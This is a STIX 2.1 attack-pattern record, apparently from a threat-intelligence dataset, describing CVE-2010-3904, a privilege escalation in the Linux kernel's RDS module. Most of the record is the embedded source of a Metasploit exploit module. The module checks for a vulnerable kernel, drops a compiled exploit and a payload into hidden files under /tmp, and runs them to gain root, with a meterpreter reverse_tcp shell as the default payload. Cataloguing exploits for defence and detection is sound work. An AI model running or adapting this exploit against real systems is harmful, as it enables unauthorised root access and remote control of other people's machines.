{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f43ad46f-bb15-424b-b79f-b4cec1c15735",
    "created": "2024-08-14T16:59:04.213326Z",
    "modified": "2024-08-14T16:59:04.213329Z",
    "name": "Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation",
    "description": " This module exploits a vulnerability in the `rds_page_copy_user` function in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/rds_rds_page_copy_user_priv_esc.rb",
            "external_id": "rds_rds_page_copy_user_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3904"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id?1024613"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=799c10559d60f159ab2232203f222f18fa3c4a5f"
        },
        {
            "source_name": "reference",
            "url": "http://vulnfactory.org/exploits/rds-fail.c"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20101020044047/http://www.vsecurity.com/resources/advisory/20101019-1/"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::Compile\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Module::Deprecated\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  moved_from 'exploit/linux/local/rds_priv_esc'\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in the `rds_page_copy_user` function\n        in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8\n        to execute code as root (CVE-2010-3904).\n\n        This module has been tested successfully on:\n\n        Fedora 13 (i686) kernel version 2.6.33.3-85.fc13.i686.PAE; and\n        Ubuntu 10.04 (x86_64) with kernel version 2.6.32-21-generic.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dan Rosenberg', # Discovery and C exploit\n          'bcoles'         # Metasploit\n        ],\n      'DisclosureDate' => '2010-10-20',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'EDB', '15285' ],\n          [ 'CVE', '2010-3904' ],\n          [ 'BID', '44219' ],\n          [ 'URL', 'https://securitytracker.com/id?1024613' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=799c10559d60f159ab2232203f222f18fa3c4a5f' ],\n          [ 'URL', 'http://vulnfactory.org/exploits/rds-fail.c' ],\n          [ 'URL', 'http://web.archive.org/web/20101020044047/http://www.vsecurity.com/resources/advisory/20101019-1/' ],\n          [ 'URL', 'http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'Notes'          =>\n        {\n          'AKA'         => ['rds-fail.c'],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def modules_disabled?\n    modules_disabled = cmd_exec('cat /proc/sys/kernel/modules_disabled').to_s.strip\n    (modules_disabled.eql?('1') || modules_disabled.eql?('2'))\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def check\n    version = kernel_release\n    unless Rex::Version.new(version.split('-').first) >= Rex::Version.new('2.6.30') &&\n           Rex::Version.new(version.split('-').first) < Rex::Version.new('2.6.37')\n      return CheckCode::Safe(\"Linux kernel version #{version} is not vulnerable\")\n    end\n    vprint_good \"Linux kernel version #{version} appears to be vulnerable\"\n\n    unless cmd_exec('/sbin/modinfo rds').to_s.include? 'Reliable Datagram Sockets'\n      return CheckCode::Safe('RDS kernel module is not available')\n    end\n    vprint_good 'RDS kernel module is available'\n\n    if modules_disabled?\n      unless cmd_exec('/sbin/lsmod').to_s.include? 'rds'\n        return CheckCode::Safe('RDS kernel module is not loadable')\n      end\n    end\n    vprint_good 'RDS kernel module is loadable'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    executable_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, exploit_data('cve-2010-3904', 'rds-fail.c')\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      arch = kernel_hardware\n      case arch\n      when /amd64|ia64|x86_64|x64/i\n        upload_and_chmodx executable_path, exploit_data('cve-2010-3904', 'rds-fail.x64')\n      when /x86|i[3456]86/\n        upload_and_chmodx executable_path, exploit_data('cve-2010-3904', 'rds-fail.x86')\n      else\n        fail_with Failure::NoTarget, \"No pre-compiled binaries are available for system architecture: #{arch}\"\n      end\n    end\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    print_status 'Launching exploit...'\n    output = cmd_exec \"#{executable_path} #{payload_path}\"\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-10-20",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}